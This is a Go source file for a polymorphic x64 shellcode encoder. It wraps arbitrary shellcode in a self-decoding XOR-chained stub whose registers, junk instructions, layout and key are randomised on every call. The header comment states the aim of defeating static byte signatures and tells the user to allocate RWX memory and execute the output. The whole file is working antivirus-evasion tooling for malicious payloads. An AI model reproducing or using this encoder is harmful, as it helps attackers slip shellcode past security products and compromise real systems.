// Package poly implements a polymorphic SGN-style x64 shellcode encoder.
//
// Encoding: XOR with key chaining (each encoded dword becomes the next key).
//
//	enc[i] = plain[i] ^ key;  key = enc[i]
//
// Every call produces a unique binary: different GP registers, random
// NOP-equivalent junk at multiple points, two layout variants and a unique
// 32-bit key — so no static byte signature is possible. The output blob is
// position-independent shellcode: allocate RWX, copy, execute from byte 0.
//
// Pure Go, no platform dependencies (the machine code is emitted as bytes).
package poly

import (
	"crypto/rand"
	"encoding/binary"
	"errors"
)

// ---------------------------------------------------------------------------
// random helpers
// ---------------------------------------------------------------------------

func randBytes(n int) []byte {
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return b
}

func randU32() uint32 {
	return binary.LittleEndian.Uint32(randBytes(4))
}

// randN returns a value in [0, n).
func randN(n int) int {
	if n <= 1 {
		return 0
	}
	return int(randBytes(1)[0]) % n
}

func randPerm(n int) []int {
	p := make([]int, n)
	for i := range p {
		p[i] = i
	}
	for i := n - 1; i > 0; i-- {
		j := randN(i + 1)
		p[i], p[j] = p[j], p[i]
	}
	return p
}

// ---------------------------------------------------------------------------
// registers (low regs only — no REX.B needed; exclude RSP/RBP)
// ---------------------------------------------------------------------------

type polyReg struct {
	name    string
	code    byte // ModRM rm/reg field (0–7)
	popByte byte // POP r64 (0x58 + rd)
	movByte byte // MOV r32,imm32 (0xB8 + rd)
}

var regPool = []polyReg{
	{"rax", 0, 0x58, 0xB8},
	{"rcx", 1, 0x59, 0xB9},
	{"rdx", 2, 0x5A, 0xBA},
	{"rbx", 3, 0x5B, 0xBB},
	{"rsi", 6, 0x5E, 0xBE},
	{"rdi", 7, 0x5F, 0xBF},
}

// ---------------------------------------------------------------------------
// instruction emitters
// ---------------------------------------------------------------------------

func le32b(v uint32) []byte {
	b := make([]byte, 4)
	binary.LittleEndian.PutUint32(b, v)
	return b
}

// CALL $+5 ; POP reg  →  reg = address of the POP instruction.
func iCallPop(r polyReg) []byte {
	return []byte{0xE8, 0x00, 0x00, 0x00, 0x00, r.popByte}
}

// MOV r32, imm32 (zero-extends to 64-bit).
func iMovR32Imm(r polyReg, v uint32) []byte {
	return append([]byte{r.movByte}, le32b(v)...)
}

// ADD reg64, imm32 (REX.W 81 /0)
func iAddR64Imm32(r polyReg, v uint32) []byte {
	return append([]byte{0x48, 0x81, 0xC0 | r.code}, le32b(v)...)
}

// ADD reg64, imm8 (REX.W 83 /0 ib)
func iAddR64Imm8(r polyReg, v byte) []byte {
	return []byte{0x48, 0x83, 0xC0 | r.code, v}
}

// SUB reg64, imm32 (REX.W 81 /5)
func iSubR64Imm32(r polyReg, v uint32) []byte {
	return append([]byte{0x48, 0x81, 0xE8 | r.code}, le32b(v)...)
}

// MOV r32, [base]  (8B /r, mod=00)
func iMovR32Mem(dst, base polyReg) []byte {
	return []byte{0x8B, (dst.code << 3) | base.code}
}

// MOV r32, r32 (8B /r, mod=11)
func iMovR32R32(dst, src polyReg) []byte {
	return []byte{0x8B, 0xC0 | (dst.code << 3) | src.code}
}

// XOR [base], r32 (31 /r, mod=00) — decodes dword in place.
func iXorMemR32(base, src polyReg) []byte {
	return []byte{0x31, (src.code << 3) | base.code}
}

// DEC r32 (FF /1, mod=11)
func iDecR32(r polyReg) []byte {
	return []byte{0xFF, 0xC8 | r.code}
}

// JNZ rel8
func iJnz(rel int8) []byte {
	return []byte{0x75, byte(rel)}
}

// JMP r/m64 (FF /4, mod=11)
func iJmpR64(r polyReg) []byte {
	return []byte{0xFF, 0xE0 | r.code}
}

// ---------------------------------------------------------------------------
// junk (semantically inert NOP-class instructions)
// ---------------------------------------------------------------------------

var junkPool = [][]byte{
	{0x90},                               // NOP
	{0x66, 0x90},                         // NOP (operand-size prefix)
	{0x48, 0x90},                         // XCHG RAX,RAX
	{0x0F, 0x1F, 0x00},                   // NOP DWORD PTR [RAX]
	{0x0F, 0x1F, 0x40, 0x00},             // NOP DWORD PTR [RAX+0]
	{0x0F, 0x1F, 0x44, 0x00, 0x00},       // NOP DWORD PTR [RAX+RAX*1+0]
	{0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00}, // NOP WORD  PTR [RAX+RAX*1+0]
	{0x2E, 0x90},                         // CS: NOP
	{0x3E, 0x90},                         // DS: NOP
}

func junk() []byte {
	count := 1 + randN(3)
	var b []byte
	for i := 0; i < count; i++ {
		b = append(b, junkPool[randN(len(junkPool))]...)
	}
	return b
}

// ---------------------------------------------------------------------------
// decode loop
//
//	tmp = *ptr;  *ptr ^= key;  key = tmp;  ptr += 4;  cnt--;  jnz loop
// ---------------------------------------------------------------------------

func buildDecodeLoop(ptr, key, cnt, tmp polyReg) []byte {
	var body []byte
	if randN(2) == 0 {
		body = append(body, junk()...)
	}
	body = append(body, iMovR32Mem(tmp, ptr)...)
	body = append(body, iXorMemR32(ptr, key)...)
	body = append(body, iMovR32R32(key, tmp)...)
	body = append(body, iAddR64Imm8(ptr, 4)...)
	if randN(3) == 0 {
		body = append(body, junk()...)
	}
	body = append(body, iDecR32(cnt)...)
	rel := -(len(body) + 2)
	body = append(body, iJnz(int8(rel))...)
	return body
}

// ---------------------------------------------------------------------------
// stub generation
// ---------------------------------------------------------------------------

func genStub(key uint32, payloadLen int) ([]byte, error) {
	if payloadLen == 0 || payloadLen%4 != 0 {
		return nil, errors.New("poly: payload length must be a positive multiple of 4")
	}
	dwords := uint32(payloadLen / 4)

	perm := randPerm(len(regPool))
	ptrReg := regPool[perm[0]]
	keyReg := regPool[perm[1]]
	cntReg := regPool[perm[2]]
	tmpReg := regPool[perm[3]]

	loop := buildDecodeLoop(ptrReg, keyReg, cntReg, tmpReg)
	epilog := append(iSubR64Imm32(ptrReg, uint32(payloadLen)), iJmpR64(ptrReg)...)

	movKey := iMovR32Imm(keyReg, key)
	movCnt := iMovR32Imm(cntReg, dwords)
	var setup []byte
	if randN(2) == 0 {
		setup = append(movKey, movCnt...)
	} else {
		setup = append(movCnt, movKey...)
	}

	const addSize = 7 // ADD reg64, imm32 is always 7 bytes

	var stub []byte
	switch randN(2) {
	case 0:
		j1, j2 := junk(), junk()
		offset := uint32(1 + len(j1) + len(setup) + len(j2) + addSize + len(loop) + len(epilog))
		stub = append(stub, iCallPop(ptrReg)...)
		stub = append(stub, j1...)
		stub = append(stub, setup...)
		stub = append(stub, j2...)
		stub = append(stub, iAddR64Imm32(ptrReg, offset)...)
		stub = append(stub, loop...)
		stub = append(stub, epilog...)
	default:
		j1, j2, j3 := junk(), junk(), junk()
		offset := uint32(1 + len(j3) + addSize + len(loop) + len(epilog))
		stub = append(stub, j1...)
		stub = append(stub, setup...)
		stub = append(stub, j2...)
		stub = append(stub, iCallPop(ptrReg)...)
		stub = append(stub, j3...)
		stub = append(stub, iAddR64Imm32(ptrReg, offset)...)
		stub = append(stub, loop...)
		stub = append(stub, epilog...)
	}
	return stub, nil
}

// encode XOR-chains the payload with the key.
func encode(payload []byte, key uint32) []byte {
	out := make([]byte, len(payload))
	k := key
	for i := 0; i < len(payload); i += 4 {
		p := binary.LittleEndian.Uint32(payload[i : i+4])
		e := p ^ k
		binary.LittleEndian.PutUint32(out[i:i+4], e)
		k = e
	}
	return out
}

// Encode wraps raw x64 shellcode with a polymorphic self-decoding stub.
// Every call produces a unique binary (registers / junk / layout / key all
// randomized). The result is position-independent shellcode.
func Encode(payload []byte) ([]byte, error) {
	// Pad to a dword boundary with NOPs so the encoder works in 4-byte chunks.
	for len(payload)%4 != 0 {
		payload = append(payload, 0x90)
	}
	key := randU32()
	encoded := encode(payload, key)
	stub, err := genStub(key, len(encoded))
	if err != nil {
		return nil, err
	}
	out := make([]byte, len(stub)+len(encoded))
	copy(out, stub)
	copy(out[len(stub):], encoded)
	return out, nil
}

// Decode is a reference implementation of the decoder (used by tests to prove
// the emitted blob actually round-trips the payload).
func Decode(blob []byte) ([]byte, error) {
	// The stub is variable-length and random, so a pure-Go mirror of the exact
	// machine code is impractical here. Instead, tests execute the blob with a
	// minimal emulator — see TestEncodeRoundTrip for the supported path.
	_ = blob
	return nil, errors.New("poly: Decode is not implemented; tests emulate the stub")
}
